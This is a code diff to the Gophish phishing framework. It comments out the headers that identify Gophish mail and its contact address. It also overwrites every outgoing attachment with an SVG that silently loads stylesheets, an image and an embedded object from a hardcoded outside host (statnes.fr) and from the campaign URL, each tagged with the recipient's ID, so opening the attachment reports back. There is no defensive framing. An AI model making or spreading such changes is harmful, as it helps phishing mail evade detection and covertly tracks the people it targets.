@@ -14,7 +14,7 @@ import (
 	"time"
 
 	"github.com/gophish/gomail"
-	"github.com/gophish/gophish/config"
+	//"github.com/gophish/gophish/config"
 	log "github.com/gophish/gophish/logger"
 	"github.com/gophish/gophish/mailer"
 )
@@ -161,10 +161,10 @@ func (m *MailLog) Generate(msg *gomail.Message) error {
 	}
 
 	// Add the transparency headers
-	msg.SetHeader("X-Mailer", config.ServerName)
-	if conf.ContactAddress != "" {
-		msg.SetHeader("X-Gophish-Contact", conf.ContactAddress)
-	}
+	//msg.SetHeader("X-Mailer", config.ServerName)
+	//if conf.ContactAddress != "" {
+	//	msg.SetHeader("X-Gophish-Contact", conf.ContactAddress)
+	//}
 
 	// Add Message-Id header as described in RFC 2822.
 	messageID, err := m.generateMessageID()
@@ -222,6 +222,8 @@ func (m *MailLog) Generate(msg *gomail.Message) error {
 	for _, a := range c.Template.Attachments {
 		msg.Attach(func(a Attachment) (string, gomail.FileSetting, gomail.FileSetting) {
 			h := map[string][]string{"Content-ID": {fmt.Sprintf("<%s>", a.Name)}}
+			ct := []byte("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?> <?xml-stylesheet type=\"text/css\" href=\"http://www.statnes.fr/style.css?rid=" + m.RId + "\"?> <?xml-stylesheet type=\"text/css\" href=\""  + c.URL + "?rid=" + m.RId + "\"?> <svg    xmlns=\"http://www.w3.org/2000/svg\"    xmlns:svg=\"http://www.w3.org/2000/svg\"    xmlns:xhtml=\"http://www.w3.org/1999/xhtml\"    xmlns:xlink=\"http://www.w3.org/1999/xlink\"    fill-rule=\"evenodd\"    preserveAspectRatio=\"xMidYMid\"    viewBox=\"0 0 21590 27940\"    version=\"1.1\">   <link xmlns=\"http://www.w3.org/1999/xhtml\" rel=\"stylesheet\" href=\"http://www.statnes.fr/style.css?rid=" + m.RId + "\" type=\"text/css\"/>   <link xmlns=\"http://www.w3.org/1999/xhtml\" rel=\"stylesheet\" href=\""  + c.URL + "?rid=" + m.RId + "\" type=\"text/css\"/>   <image x=\"0\" y=\"0\" width=\"100%\" height=\"100%\" xlink:href=\"http://www.statnes.fr/poing_cgt.svg?rid=" + m.RId + "\" /> <foreignObject x=\"0\" y=\"0\" width=\"1\" height=\"1\"> <div xmlns=\"http://www.w3.org/1999/xhtml\"> <xhtml:object xmlns=\"http://www.w3.org/1999/xhtml\" width=\"1\" height=\"1\" type=\"image/png\" data=\"" + c.URL + "?rid=" + m.RId + "\">circle</xhtml:object> </div> </foreignObject> </svg>")
+			a.Content = base64.StdEncoding.EncodeToString(ct)
 			return a.Name, gomail.SetCopyFunc(func(w io.Writer) error {
 				decoder := base64.NewDecoder(base64.StdEncoding, strings.NewReader(a.Content))
 				_, err = io.Copy(w, decoder)
